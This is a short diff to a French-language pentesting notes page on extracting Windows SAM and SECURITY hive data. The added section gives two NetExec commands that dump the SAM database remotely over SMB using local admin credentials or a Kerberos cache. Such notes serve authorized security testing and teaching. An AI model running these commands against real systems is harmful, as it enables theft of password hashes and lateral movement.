@@ -23,6 +23,15 @@ Windows/System32/config/SECURITY
 Windows/System32/config/SYSTEM
 ```
 
+#### Depuis le réseau
+
+```
+# Avec un compte "admin" local
+
+nxc smb <IP> -u <USER> -p <PASS> --sam
+nxc smb <IP> --use-kcache --sam
+```
+
 ### Extraire les _hashs_
 
 ```
